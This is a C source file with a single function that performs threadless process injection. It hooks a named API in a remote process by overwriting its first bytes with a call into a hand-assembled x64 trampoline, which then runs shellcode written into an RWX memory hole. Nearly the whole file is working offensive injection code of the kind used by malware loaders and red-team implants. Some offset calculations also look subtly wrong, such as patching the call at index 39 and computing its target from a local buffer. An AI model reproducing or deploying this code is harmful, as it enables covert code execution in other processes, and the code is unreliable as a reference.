#include "commun.h"


BOOL InjectThatMTF(HANDLE hProc, LPVOID RX_hole_addr,DATA shellcode, wchar_t* wModuleName, wchar_t* wAPIName) {
	
    // will load the shellcode and revert the hooked API
    char HookCode[] = {
        0x58,                           // pop    rax
        0x48, 0x83, 0xE8, 0x05,         // sub    rax,0x5
        0x50,                           // push   rax
        0x51,                           // push   rcx
        0x52,                           // push   rdx
        0x41, 0x50,                     // push   r8
        0x41, 0x51,                     // push   r9
        0x41, 0x52,                     // push   r10
        0x41, 0x53,                     // push   r11
        0x48, 0xB9, 0x88, 0x77, 0x66,   // movabs rcx,0x1122334455667788
        0x55,0x44, 0x33, 0x22, 0x11, 
        0x48, 0x89, 0x08,               // mov    QWORD PTR [rax],rcx
        0x48, 0x83, 0xEC, 0x40,         // sub    rsp,0x40
        0xE8, 0x11, 0x00, 0x00, 0x00,   // call   shellcode
        0x48, 0x83, 0xC4, 0x40,         // add    rsp,0x40
        0x41, 0x5B,                     // pop    r11
        0x41, 0x5A,                     // pop    r10
        0x41, 0x59,                     // pop    r9
        0x41, 0x58,                     // pop    r8 
        0x5A,                           // pop    rdx
        0x59,                           // pop    rcx
        0x58,                           // pop    rax
        0xFF, 0xE0,                     // jmp    rax
        0x90                            // nop
    };


    /*

        change 0x1122334455667788 in HookCode with 
        the Original 8 bytes of APIName opcodes 
    
    */

    size_t len = wcslen(wAPIName) + 1;
    char* APIName = (char*)malloc(len);
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, APIName, len, wAPIName, _TRUNCATE);

    // get address of the function
    FARPROC apiAddr = GetProcAddress(GetModuleHandle(wModuleName), APIName);
    if (apiAddr == NULL) {
        free(APIName);
        printf("Failed to get the address of the function.\n");
        return FALSE;
    }

    // read 8 bytes from the start of the function
    unsigned char originalOpcodes[8];
    if (!ReadProcessMemory(hProc, apiAddr, &originalOpcodes, sizeof(originalOpcodes), NULL)) {
        free(APIName);
        printf("Failed to read the original opcodes.\n");
        return FALSE;
    }

    // replace the placeholder in the hook code with the original opcodes
    memcpy(HookCode + 18, originalOpcodes, sizeof(originalOpcodes));


    /* 
        update "call shellcode" 
        in HookCode
    */

    // calculate the relative offset from the call instruction to the target address
    DWORD offset = (DWORD)((char*)RX_hole_addr - (char*)(HookCode + sizeof(HookCode)));

    // replace the placeholder offset in the hook code with the calculated offset
    memcpy(HookCode + 39, &offset, sizeof(offset));


    /*
        Hook the loaded modules 
        with the HookCode + Shellcode
    */

    DWORD oldProtect;
    // Change the protection of the memory region to RWX
    if (!VirtualProtectEx(hProc, RX_hole_addr, sizeof(HookCode) + shellcode.len, PAGE_EXECUTE_READWRITE, &oldProtect)){
        printf("VirtualProtectEx failed (%u)\n", GetLastError());
        return FALSE;
    }

    // Write the HookCode into the memory region
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProc, RX_hole_addr, HookCode, sizeof(HookCode), &bytesWritten)){
        printf("WriteProcessMemory failed (%u)\n", GetLastError());
        return FALSE;
    }

    // Write the shellcode into the memory region right after the HookCode
    if (!WriteProcessMemory(hProc, (LPBYTE)RX_hole_addr + sizeof(HookCode), shellcode.data, shellcode.len, &bytesWritten)){
        printf("WriteProcessMemory failed (%u)\n", GetLastError());
        return FALSE;
    }

    // Restore the original protection of the memory region
    if (!VirtualProtectEx(hProc, RX_hole_addr, sizeof(HookCode) + shellcode.len, oldProtect, &oldProtect)){
        printf("VirtualProtectEx failed (%u)\n", GetLastError());
        return FALSE;
    }


    /*
        Hook the API with call RX_hole_addr
    */
    
    

    // Create a call instruction which jumps to RX_hole_addr.
    unsigned char callInstruction[5] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
    offset = (DWORD)((char*)RX_hole_addr - ((char*)apiAddr + sizeof(callInstruction)));
    memcpy(callInstruction + 1, &offset, sizeof(offset));

    // Replace the first instruction of the API function with our call instruction. 
    oldProtect = 0;
    if (!VirtualProtectEx(hProc, apiAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection.\n");
        return FALSE;
    }

    bytesWritten = 0;
    if (!WriteProcessMemory(hProc, apiAddr, callInstruction, sizeof(callInstruction), &bytesWritten)) {
        printf("Failed to write the new instruction.\n");
        return FALSE;
    }


    if (bytesWritten != sizeof(callInstruction)) {
        printf("Failed to write the full instruction.\n");
        return FALSE;
    }

    return TRUE;

}